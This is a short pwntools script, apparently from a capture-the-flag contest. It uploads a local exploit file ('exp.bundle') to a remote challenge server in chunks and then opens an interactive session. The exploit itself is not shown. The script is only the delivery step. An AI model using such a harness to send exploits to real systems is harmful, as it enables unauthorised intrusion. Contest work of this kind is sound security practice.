#! /usr/bin/env python3

import socket
import os
os.chdir(os.path.dirname(os.path.abspath(__file__)))


TARGET_FILE = '../exp.bundle'

from pwn import *

#context.log_level = 'debug'

def main():
    with open(TARGET_FILE, 'rb') as f:
        data = f.read()

    #r = remote('localhost', 5555)
    r = remote('nicicd-amygexkc6fakw.shellweplayaga.me', 10101)

    r.recvuntil(b'please')

    r.sendline(b'ticket{...}')

    r.sendline(str(len(data)))
    r.recvuntil(b'bundle file')

    for i in range(0, len(data), 0x1000):
        r.send(data[i:i+0x1000])
        sleep(0.1)

    r.interactive()


if __name__ == '__main__':
    main()
    
    

    

